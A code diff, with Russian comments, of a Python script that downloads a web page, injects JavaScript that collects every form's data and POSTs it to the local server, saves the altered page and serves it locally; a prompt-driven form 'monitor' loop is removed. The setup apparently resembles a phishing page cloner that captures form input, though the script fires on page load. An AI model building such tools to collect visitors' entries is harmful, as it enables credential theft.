@@ -35,25 +35,35 @@ if url.strip():
     # Ждем некоторое время перед сохранением HTML-кода
     time.sleep(5)
 
-    # Проверяем наличие форм на странице и мониторим их
-    def monitor_forms(soup):
-        form_tags = soup.find_all('form')
-        for form_tag in form_tags:
-            form_id = form_tag.get('id', '')
-            form_class = form_tag.get('class', '')
-            print(f"Найдена форма: ID={form_id}, Классы={form_class}")
+    # Добавляем JavaScript для заполнения форм на локальном сервере
+    fill_form_script = """
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var forms = document.querySelectorAll('form');
+            forms.forEach(function(form) {
+                var formData = new FormData(form);
+                fetch('/', {
+                    method: 'POST',
+                    body: formData
+                }).then(function(response) {
+                    return response.text();
+                }).then(function(data) {
+                    console.log(data);
+                }).catch(function(error) {
+                    console.error('Ошибка:', error);
+                });
+            });
+        });
+    </script>
+    """
+    soup.body.append(BeautifulSoup(fill_form_script, 'html.parser'))
 
-            # Мониторим данные, вводимые в форму на сервере
-            print("Мониторим данные, вводимые в эту форму на сервере:")
-            while True:
-                form_data = {}
-                for input_tag in form_tag.find_all('input'):
-                    input_name = input_tag.get('name', '')
-                    input_value = input(input_name + ': ')
-                    form_data[input_name] = input_value
-                print("Введенные данные:", form_data)
+    # Сохраняем HTML-код в файл
+    file_path = 'downloaded_page.html'
+    with open(file_path, 'w', encoding='utf-8') as file:
+        file.write(str(soup.prettify()))  # Используем prettify для более красивого форматирования
 
-    monitor_forms(soup)
+    print(f"Страница успешно скачана и сохранена в файл {file_path}")
 
     # Шаг 2: Запуск локального сервера
 
